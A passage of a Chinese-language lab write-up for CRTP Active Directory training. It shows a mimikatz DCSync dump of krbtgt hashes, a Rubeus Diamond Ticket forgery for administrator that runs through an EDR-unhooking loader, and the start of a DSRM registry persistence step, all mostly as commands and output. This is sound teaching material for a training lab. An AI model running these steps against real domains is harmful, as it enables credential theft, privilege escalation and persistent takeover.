lsadump::evasive<span class="literal">-dcsync</span> /user:dcorp\krbtgt <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-dcsync /user:dcorp\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dollarcorp.moneycorp.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">59</span>:<span class="number">41</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">4</span>e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">4</span>e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    lm  - <span class="number">0</span>: ea03581a1268674a828bde6ab09db837</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">6</span>d4cc4edd46d8c3d3e59250c91eac2bd</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : e74fa5a9aa05b2c0b2d196e226d8820e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">150</span>ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">150</span>ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    <span class="number">02</span>  <span class="number">86615</span>bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    <span class="number">03</span>  <span class="number">637</span>dfb61467fdb4f176fe844fd260bac</span><br><span class="line">    <span class="number">04</span>  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    <span class="number">05</span>  <span class="number">86615</span>bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    <span class="number">06</span>  d2874f937df1fd2b05f528c6e715ac7a</span><br><span class="line">    <span class="number">07</span>  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    <span class="number">08</span>  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    <span class="number">09</span>  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    <span class="number">10</span>  <span class="number">5</span>c324b8ab38cfca7542d5befb9849fd9</span><br><span class="line">    <span class="number">11</span>  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    <span class="number">12</span>  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    <span class="number">13</span>  <span class="number">2281</span>b35faded13ae4d78e33a1ef26933</span><br><span class="line">    <span class="number">14</span>  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    <span class="number">15</span>  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    <span class="number">16</span>  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    <span class="number">17</span>  <span class="number">87</span>c75daa20ad259a6f783d61602086aa</span><br><span class="line">    <span class="number">18</span>  f0016c07fcff7d479633e8998c75bcf7</span><br><span class="line">    <span class="number">19</span>  <span class="number">7</span>c4e5eb0d5d517f945cf22d74fec380e</span><br><span class="line">    <span class="number">20</span>  cb97816ac064a567fe37e8e8c863f2a7</span><br><span class="line">    <span class="number">21</span>  <span class="number">5</span>adaa49a00f2803658c71f617031b385</span><br><span class="line">    <span class="number">22</span>  <span class="number">5</span>adaa49a00f2803658c71f617031b385</span><br><span class="line">    <span class="number">23</span>  <span class="number">6</span>d86f0be7751c8607e4b47912115bef2</span><br><span class="line">    <span class="number">24</span>  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    <span class="number">25</span>  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    <span class="number">26</span>  <span class="number">5</span>d8e8f8f63b3bb6dd48db5d0352c194c</span><br><span class="line">    <span class="number">27</span>  <span class="number">3</span>e139d350a9063db51226cfab9e42aa1</span><br><span class="line">    <span class="number">28</span>  d745c0538c8fd103d71229b017a987ce</span><br><span class="line">    <span class="number">29</span>  <span class="number">40</span>b43724fa76e22b0d610d656fb49ddd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>这个 <code>154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</code> 就是要用的key</p>
<p>再确认下要伪造的用户的sid和组sid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainObject</span> <span class="literal">-Identity</span> administrator</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">objectsid                     : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-500</span></span><br><span class="line">primarygroupid                : <span class="number">513</span></span><br><span class="line">iscriticalsystemobject        : True</span><br><span class="line">name                          : Administrator</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="string">&quot;Domain Admins&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grouptype              : GLOBAL_SCOPE, SECURITY</span><br><span class="line">admincount             : <span class="number">1</span></span><br><span class="line">iscriticalsystemobject : True</span><br><span class="line">samaccounttype         : GROUP_OBJECT</span><br><span class="line">samaccountname         : Domain Admins</span><br><span class="line">whenchanged            : <span class="number">11</span>/<span class="number">14</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">06</span>:<span class="number">37</span> PM</span><br><span class="line">objectsid              : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-512</span></span><br><span class="line">name                   : Domain Admins</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>要伪造的是administrator sid是 <code>S-1-5-21-719815819-3726368948-3917688648-500</code> 组sid是 <code>S-1-5-21-719815819-3726368948-3917688648-512</code></p>
<p>然后随便拿个能登陆的账户和凭据，做钻石票</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> diamond /krbkey:<span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:srvadmin /password:TheKeyUs3ron@anyMachine! /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /ticketuserid:<span class="number">500</span> /groups:<span class="number">512</span>  /show /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : diamond /krbkey:<span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:srvadmin /password:TheKeyUs3ron@anyMachine! /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /ticketuserid:<span class="number">500</span> /groups:<span class="number">512</span> /show /ptt</span><br><span class="line">[*] Action: Diamond Ticket</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)</span><br><span class="line">[!] Pre<span class="literal">-Authentication</span> required!</span><br><span class="line">[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsrvadmin</span><br><span class="line">[*] <span class="keyword">Using</span> aes256_cts_hmac_sha1 hash: 145019659E1DA3FB150ED94D510EB770276CFBD0CBD834A4AC331F2EFFE1DBB4</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;dollarcorp.moneycorp.local\srvadmin&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.2.1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIF+jCCBfagAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC</span><br><span class="line">      BG0wggRpoAMCARKhAwIBAqKCBFsEggRXT6mhGTntKqrFBr4YmLdEBo4WzgfrlzfqQ+<span class="number">5</span>PB5oBCna/s9xQ</span><br><span class="line">      wWk1CezP1+<span class="number">2</span>HxDDR+<span class="number">2</span>dTpmzvxHIE9DjqDLTOwnoP693WkMmxkTdBFbaoKQyj6izXzAmk7090gnBOeToi</span><br><span class="line">      <span class="number">3</span>qGA06FX5x/sqUfpNa2syLhH/e19Cwavp/h61f66isN8fLnVMq97BnCsWxgOiufTKpS2dl8of/HrtPqT</span><br><span class="line">      n42lKPqTf3gegdCZrOFZvgsWbJVPZNmGBjWdjWJ1Nrm/<span class="number">3</span>A8tLcExerEZxpO65w/n95r3kQkkMXICY0Up</span><br><span class="line">      Z14UoJPNdGjTN9bQ+UuGPwtPUzSbNr6R06TzGuth8KTJ7MarMOEkKCnbsL+uY8csWXOaGndlinHXHW7F</span><br><span class="line">      <span class="number">83</span>mb+hrc8aLKFTl7CrOxvkULwhyxIo5JBWuy6+d88WuLhOi2fuuYLnl1Um9abGUXJbvXzt94W5daBh+Z</span><br><span class="line">      <span class="number">0</span>brSnCS0lkqGJN3+J+xs4WJuen9U/<span class="number">9</span>qtvZ1nrzwljtrBNDTWE+EPVlq/eeDulnreR6P7G7iQ6vdYMYAe</span><br><span class="line">      WhzuqGQM4CZWNfbyIgvRmz/uju9DeZNotUsBdl3637Ghb3uKoRv0DethfZZPPZWhWHltBNND+mNX3ORF</span><br><span class="line">      znpiHCuLiqg2AuvSaj5tKQS+/Eeo3T02RGAycDbxB8Zv4Fk35V/AFu9TeM0tsN/<span class="number">6</span>TIAz1AAfngMA94UP</span><br><span class="line">      TFLCLb9vevKZFStcOJU685pOYiuDIhMtabXlrlYaD212mAiEhYEcXsEpoNOg5HfbiuGqbF1LAV+tcOfT</span><br><span class="line">      yLaqFIRruzNDI0ad/LLq8dpFcyp/<span class="number">3</span>FoEb4Ia4PIpj0v+ydOebJFGLUDFL1VEu4O4NwXHpyDmLZFXewsX</span><br><span class="line">      efEJmESbVoqs4YOmo5IaCQ1ow4qZRALqdHqNseD751vxOd68arOsLyrCYg30BbAQaI2taVPZTyHICLLJ</span><br><span class="line">      +kASulyBf115YH7pkeTvhVAhbkDrni4oXcXgU0YQFAEyg/<span class="built_in">h</span>+usGFKUx9w9Lo4S1uPLhNZrhJerh6qReI</span><br><span class="line">      uVA4p9MnyN4Z3fAIodR4/S5MHRo16WB81Bog3MntOIvQ/kQ42998xFQcaM0owGlWJP7ZCz/mZtHTwhdT</span><br><span class="line">      Ct5uAXDAVDxHj6dBKshhVwQdQw7+<span class="number">4</span>QBBnmx7wM6JfnDkOcrXU4gCppIFl2waunixU9Yxvm+YXZsRvEQs</span><br><span class="line">      xX3sIwCnrB/kL45CQt7ztdAnzo4MTK+J9DrZHfJKi5S0v/risX6F7/wV1kPV10jJgaVqRl3spvWHyP6o</span><br><span class="line">      DvZ5WOPg3QVY/e6VADxvCzTQeSux+csrjsJVqgBedM5GmS46XMngRSCOS+i1oEsCppf6py4ZoQlJtKOI</span><br><span class="line">      <span class="number">9</span>Qe70CtzU8DKxbgp9fl8z8dQluvHDQ7fOqGhEII/wLGWWQgQNy0L2Q4zwvLMrpM5MxlQifwlfYxhk3qO</span><br><span class="line">      oWtH/Ri119+ydRpN+ZqG5iCdXG76nnTvadUGCl8Ci9u4UQfAmj8Ahqyzjf6/YlKCcz6Fx6D7SKOCARMw</span><br><span class="line">      ggEPoAMCAQCiggEGBIIBAn2B/zCB/KCB+TCB9jCB86ArMCmgAwIBEqEiBCDRW92vPWQfgVHxjfgExfGE</span><br><span class="line">      HMe4dbSL1xwoU5iFkXe5vKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIVMBOgAwIBAaEMMAob</span><br><span class="line">      CHNydmFkbWluowcDBQBA4QAApREYDzIwMjUwNTI2MTAxNzU1WqYRGA8yMDI1MDUyNjIwMTc1NVqnERgP</span><br><span class="line">      MjAyNTA2MDIxMDE3NTVaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsG</span><br><span class="line">      a3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[*] Decrypting TGT</span><br><span class="line">[*] Retreiving PAC</span><br><span class="line">[*] Modifying PAC</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting Modified TGT</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGZjCCBmKgAwIBBaEDAgEWooIFNjCCBTJhggUuMIIFKqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC</span><br><span class="line">      BNIwggTOoAMCARKhAwIBA6KCBMAEggS8dkHO2T0GimYmTdBoRqSWscUgN01N1Be25DAJGGLzz3yU79+C</span><br><span class="line">      <span class="number">1</span>W7wB90hiK80V4zYkhjgqEhyuk+l1d6vvwGveiFJ/<span class="number">7</span>SkT8nYjbTh2SjFv6VBLbCaEAhlBPW+LoQmVCtF</span><br><span class="line">      L23oXqKJ5iIgSbJ5MbELVT5o45dZ57okZ+YyhFA6NqWgfD44yDhZMjKzvT4hq5WmGhzo3fv8/B5lQXuN</span><br><span class="line">      r1H8q9yHohgd9hafC3rzlzQz5Wwth+bx9UUDdNDqo5YGYcurHswo7VRJAWSzucjaE7bP6LBx0+bjOG1g</span><br><span class="line">      <span class="number">8</span>SX/qxXa681vPWWcBUkjAlgw7fim4N9vsiQYJ+h2SDC9RhL2f1uB7r1lpkZeUXjJ9A50us03WWTCGpr+</span><br><span class="line">      m7fCmGIOYelr6eAqM2bGlwbrQbd/QUzO6u9WNqjb8amTJijTKOIIqKmRtuQclgVBtr8+pihsel3ggyJr</span><br><span class="line">      Mye8t8JNFwvuDqQpxJDdUIbzJzWjaXibgP7a70qsEvEV6Vu1<span class="built_in">FC</span>/EPowuiYmYur/w2w455AixOqkXBbvs</span><br><span class="line">      hDp3RCrNG3mUvEqPTCkTDqsTMDgWLGRtwR0ZEB9qy27vSiCBy3jRjrwpA4a/F2wXTzXia9MUjftBIiDB</span><br><span class="line">      <span class="number">6</span>dbfrXydZDs1zHPzxFcmJbQ0sql7AO+vsB9MzW099rfuUTHF8bDf5gA8PGK0/qHWY0O3Hs43TDoA7aDr</span><br><span class="line">      FwMqB52QaWBky5CnAoLefgLC0pXKHazeLI7cIPETw1llTAqhvaDBnGKwl0CTVoo5TcvpLszeatKwOscN</span><br><span class="line">      <span class="number">10</span>I9Fu5uDnEcnNV3L+uPPYb9/G0JRHiIq1He1pPyedqS/ro97wiHXK5RoU8/NyAgDGzFXY+PtmV6J7oK</span><br><span class="line">      WKYSgizIk9K+<span class="number">0</span>BQiX/nsLE6f122Y5GZeAi/fyLCBu59sf/e2DGe1DYR4wB+wQyoVP6IIqV727sb+LARJ</span><br><span class="line">      JbSdLYCxd5sjIvl5S04PlUojiLXnt+RECfpHsinXtl/vb9MUn3oRG144HOLkmDqoGruTuFwRYBVpyjZZ</span><br><span class="line">      <span class="number">1</span>ge9JFlJ2plglUG0GcXMAXO3AoM3ZWheP3nQxA885Ku9CVj1hVF0DSWm6kYrXl/WI35OrovoIYoldSUD</span><br><span class="line">      zTr5asO6mbLk1HsoeDsvuF7Zcajj5x5WCmhUuNl5yzvQQtAMmKYIKzNCjpHGfmVAiHFKuBNwBfVWszwD</span><br><span class="line">      uiIQD3vntyT+IaadiEuxVX8I7pYC2cLtOnv8N0vXbBP+Rom74X37SjLeoCiRtFN8Z7DtsVj0+YlEZd9<span class="built_in">h</span></span><br><span class="line">      L332nDa751kQ4fDIpi8QYASKn9+XBj9O9e9/OFCwdC+SGhIeZNshGLeniFhzxJjGpHEWXaV4up/FyS3l</span><br><span class="line">      Z+aEnm0Z5ptaEFAHnJSWgoIY9QzhQAuFGpbcsqsYb400FQEz2dVeRLXMEeV7Rj/M90MOPYKCLtyUKKp9</span><br><span class="line">      Adi59JkTY2XT/uyGnqDX0Ny5qzXv3yZmvl13nYDx4MMe/qL+r4JLkVG3sJxotWwO7jhw87NvlETx2L/K</span><br><span class="line">      <span class="number">9</span>HGjVSPiu36xKQk5NfV7rgHjA/gAAm/sChGRDUfkktsmIM2UjyKBpEZ4/loTi9tW6XBVY7HVn1oPdQYj</span><br><span class="line">      yw7L/pSit5BDVORkP2qh2N2v3RrhjPfABd3Wsq8sHDrfxMbro4IBGjCCARagAwIBAKKCAQ0EggEJfYIB</span><br><span class="line">      BTCCAQGggf4wgfswgfigKzApoAMCARKhIgQg0Vvdrz1kH4FR8Y34BMXxhBzHuHW0i9ccKFOYhZF3ubyh</span><br><span class="line">      HBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcD</span><br><span class="line">      BQBA4QAApREYDzIwMjUwNTI2MTAxNzU1WqYRGA8yMDI1MDUyNjIwMTc1NVqnERgPMjAyNTA2MDIxMDE3</span><br><span class="line">      NTVaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xM</span><br><span class="line">      QVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>查看票据，已经伪造好administrator票据了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x58d4a6</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL</span></span><br><span class="line">        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL <span class="selector-tag">@</span> DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">17</span>:<span class="number">55</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">13</span>:<span class="number">17</span>:<span class="number">55</span> (local)</span><br><span class="line">        Renew Time: <span class="number">6</span>/<span class="number">2</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">17</span>:<span class="number">55</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br></pre></td></tr></table></figure>

<p>然后试下访问dc，就结束</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-36.png" alt="alt text"></p>
<h2 id="Learning-Objective-11-1"><a href="#Learning-Objective-11-1" class="headerlink" title="Learning Objective - 11	- 1"></a>Learning Objective - 11	- 1</h2><blockquote>
<p>Name of the Registry key modified to change Logon behavior of DSRM administrator</p>
</blockquote>
<blockquote>
<p>修改注册表key来让dsrm administrator可以登录</p>
</blockquote>
<p>要修改掉dc的dsrm管理员登录的注册表，vaule改成<code>2</code>，允许dsrm管理员通过网络登录到dc机器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</span><br></pre></td></tr></table></figure>

<p>用刚才的钻票伪造个用户，然后上dc改下注册表</p>
<p>上来之后可以看下他有没有这个key</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; reg query HKLM\System\CurrentControlSet\Control\Lsa\</span><br><span class="line">reg query HKLM\System\CurrentControlSet\Control\Lsa\</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</span><br><span class="line">    auditbasedirectories    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    auditbaseobjects    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    Bounds    REG_BINARY    <span class="number">0030000000200000</span></span><br><span class="line">    crashonauditfail    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    fullprivilegeauditing    REG_BINARY    <span class="number">00</span></span><br><span class="line">    LimitBlankPasswordUse    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    NoLmHash    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    Security Packages    REG_MULTI_SZ    <span class="string">&quot;&quot;</span></span><br><span class="line">    Notification Packages    REG_MULTI_SZ    rassfm\<span class="number">0</span>scecli</span><br><span class="line">    Authentication Packages    REG_MULTI_SZ    msv1_0</span><br><span class="line">    LsaPid    REG_DWORD    <span class="number">0</span>x2cc</span><br><span class="line">    LsaCfgFlagsDefault    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    SecureBoot    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    ProductType    REG_DWORD    <span class="number">0</span>x7</span><br><span class="line">    disabledomaincreds    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    everyoneincludesanonymous    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    forceguest    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    restrictanonymous    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    restrictanonymoussam    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\AccessProviders</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Audit</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\CachedMachineNames</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\CentralizedAccessPolicies</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\ClaimsTransformation</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\ComponentUpdates</span><br><span 